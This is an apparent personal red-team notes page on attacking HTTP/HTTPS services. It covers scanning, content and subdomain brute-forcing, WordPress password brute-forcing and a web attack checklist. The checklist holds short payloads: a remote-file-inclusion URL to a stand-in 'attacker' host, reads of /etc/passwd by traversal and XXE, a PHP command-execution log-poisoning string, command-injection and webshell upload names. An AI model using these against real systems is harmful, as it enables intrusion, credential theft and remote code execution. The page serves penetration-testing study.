---
title: 80,443 HTTP/HTTPS
parent: Services
grand_parent: Red Team
nav_order: 80
---
# HTTP / HTTPS

---

## Default Port

- 80
- 443
- 8000 (python)

---

## Service Info

Web service used to host applications and APIs.
Commonly exposes misconfigurations, sensitive files, and injection points.

---

## Common security issues

- Exposed admin panels
- Directory listing enabled
- Misconfigured file upload
- Injection vulnerabilities (SQL / XSS / RCE)
- Sensitive files (.env, backups, configs)

---

# *Scan*

---

## Banner / Vulnerability Scan 

```zsh
nmap -Pn -p80 -sCV -A -oN 80_sCVA <IP> --min-rate=5000
```
- -sCV
- -A 
- --min-rate=5000 

## Vulnerability Scan Tools
### [Nessus](../97_tools/web_scan/vulnerability/nessus.md)

### Nikto

```zsh
nikto -h http://192.168.11.19:12380/
```
### [nuclei](..//tools/web_scan/vulnerability/nuclei)

```bash
nuclei -target http://192.168.121.16
```

### [Kiterunner]()

```zsh
kr scan http://localhost:8080 -A raft-small-words
```

### [Arjun](../97_tools/web_scan/vulnerability/arjun.md)

```zsh
arjun -u https://example.com/search
```

---

# *Enumeration & Discovery*

---

# Basic Infomation

## on browser
- view page source
- Wappalyzer
- comment out
- robots.txt
- Source code

```bash
whatweb -a 3 http://<IP>
```

```bash
curl -I -sK http://<IP>
```

👉 Identify:
* Server
* Framework
* Technologies
* CMS (WordPress, Joomla, etc.)
* Backend language (PHP, ASP, Node)

## keywords gathering
### e-mail address

```zsh
cewl http://192.168.155.145 -e -n -w email.txt
```


---

#  Web Content Discovery

## Important Files by Web Server


<details markdown="1">
<summary>PHP (Apache / nginx + PHP-FPM)</summary>

### Extension Explanation

| Extension           | Description                        |
| ------------------- | ---------------------------------- |
| `.php`              | Standard PHP application files     |
| `.phtml`            | Alternative PHP template extension |
| `.php3/.php4/.php5` | Legacy PHP versions                |
| `.phps`             | PHP source highlighting files      |
| `.inc`              | Include files                      |
| `.env`              | Environment secrets                |
| `.ini`              | Configuration files                |
| `.sql`              | Database dumps                     |
| `.sqlite3`          | SQLite databases                   |
| `.log`              | Log files                          |

</details>

<details markdown="1">
<summary>ASP.NET / IIS</summary>

### Extension Explanation

| Extension | Description                 |
| --------- | --------------------------- |
| `.aspx`   | ASP.NET web pages           |
| `.asmx`   | Legacy ASP.NET web services |
| `.ashx`   | HTTP handlers               |
| `.svc`    | WCF endpoints               |
| `.config` | IIS/application configs     |
| `.cshtml` | Razor templates             |
| `.master` | Master pages                |
| `.cs`     | C# source                   |
| `.vb`     | VB.NET source               |

</details>

<details markdown="1">
<summary>Java (Tomcat / Spring / JBoss)</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.jsp` | Java Server Pages |
| `.jspx` | XML-based JSP pages |
| `.do` | Apache Struts actions |
| `.action` | MVC action routes |
| `.war` | Java web archives |
| `.properties` | Configuration files |
| `.xml` | Application configuration |
| `.jar` | Java libraries |

</details>

<details markdown="1">
<summary>Python (Django / Flask)</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.py` | Python source files |
| `.pyc` | Compiled Python bytecode |
| `.wsgi` | WSGI application entrypoint |
| `.sqlite3` | SQLite database files |
| `.yaml/.yml` | YAML configuration |
| `.cfg/.ini` | Configuration files |
| `.env` | Environment secrets |

</details>

<details markdown="1">

<summary>Node.js / Express</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.js` | JavaScript application files |
| `.json` | Configuration/API responses |
| `.map` | Source maps |
| `.npmrc` | NPM configuration |
| `.env` | Environment secrets |
| `package-lock.json` | Dependency metadata |

</details>

<details markdown="1">
<summary>Ruby on Rails</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.rb` | Ruby source files |
| `.erb` | Embedded Ruby templates |
| `.rhtml` | Legacy Rails templates |
| `.yml/.yaml` | Rails configuration files |
| `database.yml` | Database credentials/configuration |

</details>

<details markdown="1">
<summary>Go Web Applications</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.go` | Go source files |
| `.tpl/.tmpl` | Template files |
| `.toml` | Application configuration files |
| `.yaml/.yml` | Service configuration |
| `.env` | Environment secrets |

</details>

<details markdown="1">
<summary>Generic Sensitive Extensions</summary>

### Extension Explanation

| Extension | Description |
|---|---|
| `.bak` | Backup copies |
| `.old` | Old application versions |
| `.save` | Saved backup files |
| `.swp` | Vim swap files |
| `.tmp` | Temporary files |
| `.orig` | Original file backups |
| `~` | Editor backup files |
| `.zip/.tar/.gz/.7z` | Archive files |

</details>

<details markdown="1">
<summary>Generic Sensitive FIlenames</summary>

### Filename Explanation

| Filename | Description |
|---|---|
| `.env` | Environment secrets |
| `.git/config` | Git repository configuration |
| `.htaccess` | Apache access configuration |
| `.htpasswd` | Apache password file |
| `.web.config` | IIS configuration |
| `backup.zip` | Archived backups |
| `db.sql` | Database dumps |

</details>

---
## Enumeration Tools

<details markdown="1">
<summary>feroxbuster</summary>
## feroxbuster

```zsh
feroxbuster \
-u http://target \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

Option	Description

- -u	Target URL
- -w	Wordlist path
- -x	File extensions to test
- -d 2	Recursion depth
- -t 25	Concurrent threads
- -r	Follow redirects
- --random-agent	Use random User-Agent
- -C 403,404	Filter HTTP 403,404 responses
- -o	Output file

### skip directory

```zsh
feroxbuster -u http://target.local --dont-scan admin uploads backup
```
- --dont-scan

</details>


<details markdown="1">
<summary>ffuf</summary>
## ffuf

```zsh
ffuf \
-u http://target/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-e .html,.php,.txt,.bak,.zip,.old \
-recursion \
-recursion-depth 2 \
-t 25 \
-rate 50 \
-ac \
-r \
-H "User-Agent: Mozilla/5.0" \
-o ffuf.json \
-of json
```

Option	Description

- -u	Target URL with FUZZ keyword
- -w	Wordlist path
- -e	File extensions to append
- -recursion	Enable recursive scanning
- -recursion-depth 2	Maximum recursion depth
- -t 25	Concurrent threads
- -rate 50	Requests per second
- -ac	Auto-calibration filtering
- -r	Follow redirects
- -H	Custom HTTP header
- -o	Output file
- -of json	Output format

</details>


<details markdown="1">
<summary>gobuster</summary>
## gobuster

```zsh
gobuster dir \
-u http://target \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-x html,php,txt,bak,zip,old \
-t 25 \
-k \
-r \
--random-agent \
-b 403,404 \
-o gobuster.txt
```

Option	Description
- dir	Directory brute force mode
- -u	Target URL
- -w	Wordlist path
- -x	File extensions to test
- -t 25	Concurrent threads
- -k	Skip TLS verification
- -r	Follow redirects
- --random-agent	Randomize User-Agent
- -b 403,404	Exclude HTTP 403,404 responses
- -o	Output file

</details>

<details markdown="1">
<summary>dirb</summary>
## dirb

```zsh
dirb http://target \
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-X .php,.txt,.bak,.zip,.old \
-z 50
Option Explanation
Option	Description
-X	File extensions to append
-z 50	Delay requests by 50ms
```

DIRB performs recursive scanning by default.

</details>


<details markdown="1">
<summary>dirbuster</summary>
## DirBuster

Recommended Configuration (GUI)
Setting	Value
- Wordlist	raft-large-directories.txt
- File Extensions	php, txt, bak, zip, old
- Threads	25
- Recursive Scanning	Enabled
- Detect 403,404 Responses	Enabled
- Random User Agents	Enabled
- Recommended Wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

![](../../assets/images/Pasted%20image%2020260512192606.png)

Source:
https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com

</details>

---

# Subdomain & VHOST Discovery

<details markdown="1">
<summary>feroxbuster</summary>

## feroxbuster

feroxbuster is primarily designed for content discovery and does not provide native DNS subdomain enumeration or VHOST fuzzing features.

Common Workflow

Use another tool such as:

ffuf
gobuster

for:

DNS subdomain enumeration
Virtual host discovery

</details>

<details markdown="1">
<summary>ffuf</summary>
## ffuf
### Subdomain Discovery

```zsh
ffuf \
-u http://target \
-H "Host: FUZZ.target" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 25 \
-rate 50 \
-ac \
-fs 0 \
-H "User-Agent: Mozilla/5.0" \
-o ffuf_subdomains.json \
-of json
```

Option	Description
- -u	Base target URL 
- -H "Host: FUZZ.target"	Inject fuzzed subdomain into Host header
- -w	Wordlist path
- -t 25	Concurrent threads
- -rate 50	Requests per second
- -ac	Auto-calibration filtering
- -fs 0	Filter empty responses
- -H	Custom HTTP header
- -o	Output file
- -of json	Output format

### VHOST Discovery

```zsh
ffuf \
-u http://target \
-H "Host: FUZZ.target" \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 25 \
-rate 50 \
-ac \
-H "User-Agent: Mozilla/5.0" \
-o ffuf_vhosts.json \
-of json
```

Option	Description
- -H "Host: FUZZ.target"	Fuzz virtual host names
- -ac	Automatically filter wildcard responses
- -rate 50	Rate limit requests
- -t 25	Concurrent threads

</details>

<details markdown="1">
<summary>gobuster</summary>
## gobuster

### Subdomain Discovery

```zsh
gobuster dns \
-d target \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 25 \
-i \
-o gobuster_subdomains.txt
```


Option	Description

- dns	DNS enumeration mode
- -d	Target domain
- -w	Wordlist path
- -t 25	Concurrent threads
- -i	Show IP addresses
- -o	Output file

### VHOST Discovery

```zsh
gobuster vhost \
-u http://target \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 25 \
-k \
-r \
--append-domain \
-o gobuster_vhosts.txt
```

Option	Description
- vhost	Virtual host fuzzing mode
- -u	Target URL
- -w	Wordlist path
- -t 25	Concurrent threads
- -k	Skip TLS verification
- -r	Follow redirects
- --append-domain	Append base domain automatically
- -o	Output file

</details>

---

# Parameter Discovery

<details markdown="1">
<summary>ffuf</summary>

```zsh
ffuf -u 'http://192.168.11.21/test.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 80
```
- -u URL
- -w wordlist
- -fs 

👉 Find hidden parameters

</details>

---

# CMS-Specific


<details markdown="1">
<summary>WordPress</summary>

### WordPress
#### [2_wpscan](../97_tools/web_scan/cms/2_wpscan.md)

```zsh
wpscn --url http//192.168.218.217/assets/fonts/blog/ --plugins-detection aggressive
```

```bash
wpscan --url http://192.168.201.239/ --enumerate vp,u,vt,tt --verbose
```

```zsh
wpscan --url http://192.168.201.239/ --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,hugo,philip
```
#### [3_wpprobe](../97_tools/web_scan/cms/3_wpprobe.md)
```zsh
wpprobe scan -u http://192.168.147.123/wordpress -v
```

```shell
wpprobe scan -f targets.txt -t 20 -o results.json
```

👉 If login success:
→ [WordPress_PHP](../98_weaponization/Generate_ReverseShell/WordPress_PHP.md) 
### Joomla 

[4_joomscan](../97_tools/web_scan/cms/4_joomscan.md)
```bash
joomscan -u http://localhost/
```

### Drupal
### Scan
```bash
droopescan scan drupal -u http://192.168.0.101
```

</details>

---

# *Attack*

---
👉 Check:
# Web Attack Checklist by Entry Point

---


<details markdown="1"><summary>URL Parameters</summary>

## Examples

```http
?id=1
?page=home.php
?file=test.txt
?url=http://example.com
```

## Things to Test

### SQL Injection (SQLi)

```sql
'
"
1 OR 1=1
```

### Insecure Direct Object Reference (IDOR)

```http
?id=1001
?id=1002
```

### Local File Inclusion (LFI)

```http
?page=../../../../etc/passwd
```

### Server-Side Request Forgery (SSRF)

```http
?url=http://127.0.0.1
```

### Remote File Inclusion (RFI)

```http
?page=http://attacker/shell.txt
```

### Cross-Site Scripting (XSS)

```html
<script>alert(1)</script>
```
</details>

---
<details markdown="1"><summary>検索フォーム</summary>
## Example

```html
<input name="search">
```

## Things to Test

### SQL Injection (SQLi)

```sql
'
"
```

### Cross-Site Scripting (XSS)

```html
<script>alert(1)</script>
```

### Server-Side Template Injection (SSTI)

```text
{{7*7}}
${7*7}
```

### Command Injection

```bash
;id
&&whoami
```
</details>

---
<details markdown="1"><summary>ログインフォーム</summary>

## Example

```text
username
password
```

## Things to Test

### SQL Injection (SQLi)

```sql
admin'--
```

### Default Credentials

```text
admin:admin
admin:password
root:root
```

### Password Spraying

```text
Summer2025!
Winter2025!
CompanyName123!
```
</details>

---
<details markdown="1"><summary>File Upload</summary>
## Example

```html
<input type="file">
```

## Things to Test

### Upload Bypass

```text
shell.php
shell.phtml
shell.php.jpg
shell.jpg.php
shell.phar
shell.php5
```

### XXE (SVG Upload)

```xml
<!DOCTYPE foo>
```

### Image Processing Vulnerabilities

```text
ImageMagick
ExifTool
GraphicsMagick
```
</details>

---

<details markdown="1"><summary>File Download</summary>

## Example

```http
download.php?file=
```

## Things to Test

### [Directory Traversal](docs/02_Red/04_web_attack/directory_traversal)

```text
../../../etc/passwd
```

### Local File Inclusion (LFI)

```text
../../../../windows/win.ini
```
</details>

---

<details markdown="1"><summary>URL Paths</summary>
## Examples

```http
/profile/1001
/api/user/1
```

## Things to Test

### Insecure Direct Object Reference (IDOR)

```text
1001 → 1002
1 → 2
```

### [Directory Traversal](docs/02_Red/04_web_attack/directory_traversal)

```text
../../../etc/passwd
```
</details>

---

<details markdown="1"><summary>XML Input</summary>

## Example

```xml
<user>test</user>
```

## Things to Test

### XML External Entity (XXE)

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
</details>

---

<details markdown="1"><summary>JSON APIs</summary>

## Example

```json
{
  "username": "test"
}
```

## Things to Test

### Insecure Direct Object Reference (IDOR)

```json
{
  "userid": 1001
}
```

### SQL Injection (SQLi)

```json
{
  "username": "'"
}
```

### Server-Side Template Injection (SSTI)

```json
{
  "name": "{{7*7}}"
}
```
</details>

---

<details markdown="1"><summary>HTTP Headers</summary>

## Common Headers

```http
Host:
Referer:
User-Agent:
X-Forwarded-For:
```

## Things to Test

### Cross-Site Scripting (XSS)

```http
User-Agent: <script>alert(1)</script>
```

### Server-Side Template Injection (SSTI)

```http
User-Agent: {{7*7}}
```

### Log Poisoning

```http
User-Agent: <?php system($_GET['cmd']); ?>
```
</details>

---

<details markdown="1"><summary>Cookies</summary>
## Example

```http
Cookie: role=user
```

## Things to Test

### Privilege Escalation

```http
role=admin
isAdmin=true
uid=1
```

### Deserialization

```text
Base64
JWT
Serialized Objects
PHP Serialization
Java Serialization
```
</details>

---
## Credentials Found?

👉 If yes:

* Try login panels
* Reuse for:

  * [SSH](22_ssh.md)
  * [SMB](139,445_smb.md)
  * [WinRM](5985,5986_winrm.md)

---

# Webshell

### predater

### Shell Obtained?

👉 If yes:

→ [Linux Privilege Escalation](../07_linux_priv/linux.md)

→ [Windows Privilege Escalation](../08_windows_priv/windows.md)

or

Lateral Movement / Pivot
- [ligolo](../06_pivot_tunneling/ligolo.md)
- [chisel](../06_pivot_tunneling/chisel.md)
- [ssh-tunnel](../06_pivot_tunneling/ssh_tunnel.md)
---

